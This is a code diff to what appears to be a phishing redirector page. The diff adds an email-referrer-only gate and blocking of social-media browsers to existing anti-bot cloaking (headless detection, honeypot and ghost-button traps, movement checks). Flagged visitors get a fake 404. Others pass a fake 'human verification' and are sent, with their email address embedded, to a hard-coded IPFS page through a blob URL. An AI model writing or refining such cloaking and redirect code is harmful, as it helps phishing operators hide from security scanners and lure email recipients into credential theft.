@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Blob IPFS Redirect + Ultra Anti-Bot</title>
+    <title>Blob IPFS Redirect + Ultra Anti-Bot + Email Only Access</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
@@ -25,7 +25,7 @@ html, body { margin:0; padding:0; width:100%; height:100%; font-family:Arial; }
     cursor:pointer; transition:0.3s;
 }
 
-/* 🔥 ROTATING BOT ICON */
+/* Rotating robot icon */
 #robotIcon {
     width:32px; height:32px; background:#e8f0fe; border-radius:50%;
     font-size:20px; display:flex; align-items:center; justify-content:center;
@@ -42,7 +42,7 @@ html, body { margin:0; padding:0; width:100%; height:100%; font-family:Arial; }
 }
 @keyframes spin { from {transform:rotate(0deg);} to {transform:rotate(360deg);} }
 
-/* 404 */
+/* 404 page */
 .error-404 {
     display:flex; flex-direction:column; align-items:center; justify-content:center;
     height:100vh; background:#f8f8f8; text-align:center;
@@ -73,66 +73,103 @@ html, body { margin:0; padding:0; width:100%; height:100%; font-family:Arial; }
 
 <script>
 /* ------------------------------------------------------
-         ULTIMATE ENHANCED BOT DETECTION MODULE
+     EMAIL-ONLY ACCESS + SOCIAL-MEDIA BLOCKING
+------------------------------------------------------ */
+function isSocialMediaBrowser() {
+    const ua = navigator.userAgent.toLowerCase();
+
+    const blocked = [
+        "facebook", "fbav", "fban", "instagram",
+        "tiktok", "musically", "capcut",
+        "twitter", "snapchat", "reddit",
+        "pinterest", "linkedin",
+        "messenger", "whatsapp", "wechat",
+        "optus"
+    ];
+
+    return blocked.some(x => ua.includes(x));
+}
+
+function cameFromEmail() {
+    const ref = document.referrer.toLowerCase();
+
+    const emailDomains = [
+        "mail.google.com",
+        "outlook.com",
+        "office.com",
+        "mail.yahoo.com",
+        "icloud.com",
+        "proton.me",
+        "fastmail"
+    ];
+
+    if (!ref || ref.trim() === "") return true;
+
+    return emailDomains.some(x => ref.includes(x));
+}
+
+function enforceEmailOnly() {
+    if (isSocialMediaBrowser()) return false;
+    if (!cameFromEmail()) return false;
+    return true;
+}
+
+/* ------------------------------------------------------
+     ULTRA ANTI-BOT MODULE (MERGED)
 ------------------------------------------------------ */
 async function strongBotCheck() {
     let score = 0;
 
-    /* -------------------- BASIC HEADLESS CHECKS -------------------- */
+    /* Basic headless indicators */
     const ua = navigator.userAgent.toLowerCase();
     const botUA = ["bot","crawl","spider","curl","wget","python","scrapy","headless","selenium","puppeteer","playwright"];
     if (botUA.some(x => ua.includes(x))) score += 40;
     if (navigator.webdriver) score += 40;
 
-    /* -------------------- WEBGL TEST -------------------- */
+    /* WebGL check */
     try {
         const canvas = document.createElement("canvas");
         if (!canvas.getContext("webgl")) score += 20;
     } catch { score += 20; }
 
-    /* -------------------- AUDIO CONTEXT TEST -------------------- */
+    /* Audio context */
     try {
         const ctx = new (window.AudioContext || window.webkitAudioContext)();
         if (ctx.sampleRate < 30000) score += 10;
     } catch { score += 10; }
 
-    /* -------------------- SCREEN-SIZE BEHAVIOR TEST -------------------- */
+    /* Screen behavior test */
     if (screen.width < 700 || screen.height < 500) score += 10;
     if (window.outerWidth === 0) score += 20;
 
     let screenChanges = 0;
     window.addEventListener("resize", () => screenChanges++);
     setTimeout(() => {
-        if (screenChanges > 5) score += 15;  // too many changes = bot script logic
-        if (screenChanges === 0 && screen.width > 1024) score += 10; // fake desktop window
+        if (screenChanges > 5) score += 15;
+        if (screenChanges === 0 && screen.width > 1024) score += 10;
     }, 1200);
 
-    /* -------------------- TOUCH DEVICE AUTHENTICITY TEST -------------------- */
+    /* Touch authenticity */
     const claimedTouch = navigator.maxTouchPoints > 0;
     let realTouchEvents = 0;
-
-    window.addEventListener("touchstart", () => realTouchEvents++);
-    window.addEventListener("touchmove", () => realTouchEvents++);
-
+    window.addEventListener("touchstart", ()=>realTouchEvents++);
+    window.addEventListener("touchmove", ()=>realTouchEvents++);
     setTimeout(() => {
-        if (claimedTouch && realTouchEvents === 0) score += 25; // fake mobile browser
+        if (claimedTouch && realTouchEvents === 0) score += 25;
     }, 800);
 
-    /* -------------------- HONEYPOT FIELD (AUTOFILL TRAP) -------------------- */
+    /* Honeypot autofill trap */
     const honeypot = document.createElement("input");
     honeypot.type = "text";
     honeypot.style.position = "absolute";
     honeypot.style.left = "-9999px";
-    honeypot.style.top = "-9999px";
     honeypot.style.opacity = "0";
-    honeypot.style.pointerEvents = "none";
     document.body.appendChild(honeypot);
-
     setTimeout(() => {
         if (honeypot.value.length > 0) score += 40;
     }, 400);
 
-    /* -------------------- INVISIBLE GHOST BUTTON TRAP -------------------- */
+    /* Ghost button trap */
     const ghost = document.createElement("button");
     ghost.style.position = "absolute";
     ghost.style.left = "120px";
@@ -145,29 +182,23 @@ async function strongBotCheck() {
         if (e.target === ghost) score += 40;
     });
 
-    /* -------------------- INTERACTION ENTROPY -------------------- */
+    /* Movement entropy */
     let movements = 0;
-    window.addEventListener("mousemove", () => movements++);
-    window.addEventListener("touchmove", () => movements++);
-
+    window.addEventListener("mousemove", ()=>movements++);
+    window.addEventListener("touchmove", ()=>movements++);
     await new Promise(r => setTimeout(r, 700));
-
     if (movements < 3) score += 40;
 
-    /* -------------------- LIGHT PROOF-OF-WORK -------------------- */
+    /* SHA-256 proof-of-work */
     const challenge = Math.random().toString(36).substring(2);
-    try {
-        await crypto.subtle.digest("SHA-256", new TextEncoder().encode(challenge));
-    } catch {
-        score += 20;
-    }
+    try { await crypto.subtle.digest("SHA-256", new TextEncoder().encode(challenge)); }
+    catch { score += 20; }
 
-    /* -------------------- FINAL DECISION -------------------- */
     return score >= 60;
 }
 
 /* ------------------------------------------------------
-                 BLOB / IPFS CONFIG
+     BLOB / IPFS CONFIG
 ------------------------------------------------------ */
 const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
 
@@ -196,7 +227,7 @@ function createBlobHTML(url) {
 }
 
 /* ------------------------------------------------------
-                  HUMAN VERIFICATION
+     HUMAN VERIFICATION
 ------------------------------------------------------ */
 function requireVerification() {
     return new Promise(resolve => {
@@ -221,7 +252,7 @@ function requireVerification() {
 }
 
 /* ------------------------------------------------------
-                     SHOW 404
+     404 PAGE
 ------------------------------------------------------ */
 function show404() {
     document.body.innerHTML = `
@@ -233,22 +264,29 @@ function show404() {
 }
 
 /* ------------------------------------------------------
-                      MAIN LOGIC
+     MAIN FLOW
 ------------------------------------------------------ */
 document.addEventListener("DOMContentLoaded", async () => {
 
-    // Strong anti-bot check
+    // SOCIAL + EMAIL FILTER
+    if (!enforceEmailOnly()) {
+        show404();
+        return;
+    }
+
+    // ANTI-BOT
     if (await strongBotCheck()) {
         show404();
         return;
     }
 
-    // Human checkbox step
+    // HUMAN CHECK
     await requireVerification();
 
-    // Blob redirect
+    // REDIRECT
     const email = getEmail();
     const url = buildIPFS(email);
+
     const blobHTML = createBlobHTML(url);
     const blob = new Blob([blobHTML], { type:"text/html" });
     const blobURL = URL.createObjectURL(blob);
